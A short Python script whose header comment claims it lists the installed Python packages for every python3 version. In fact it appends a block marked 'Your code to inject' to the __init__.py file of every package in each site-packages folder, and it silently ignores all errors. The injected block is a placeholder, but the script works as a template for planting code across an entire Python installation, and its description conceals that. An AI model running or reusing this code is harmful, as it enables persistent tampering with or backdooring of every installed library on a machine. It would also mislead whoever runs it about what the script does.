# List all python packages installed on
# all python3 versions in the machine:
import os

# Setup:
main = "/usr/local/lib/python3."
sp_path = "/site-packages/"

# Get packages installed:
def list_folders():
    return os.listdir()

# Your code to inject:
code = """\nif __name__ == '__main__':
    pass
"""

# Try to
for i in range(0, 11):
    cwd = main + str(i) + sp_path
    try:
        # Access folder:
        os.chdir(cwd)
        # List packages:
        for i in list_folders():
            # Try to open __init__ file for each pkg:
            with open(cwd + "{0}/__init__.py".format(i), "r") as fl:
                data = fl.read()
            # Inject new code:
            with open(cwd + "{0}/__init__.py".format(i), "w") as fl:
                fl.write(data + code)
        # Do something after all?
        # No. :)
    except Exception as error:
        # Ignore error and try a new version:
        continue
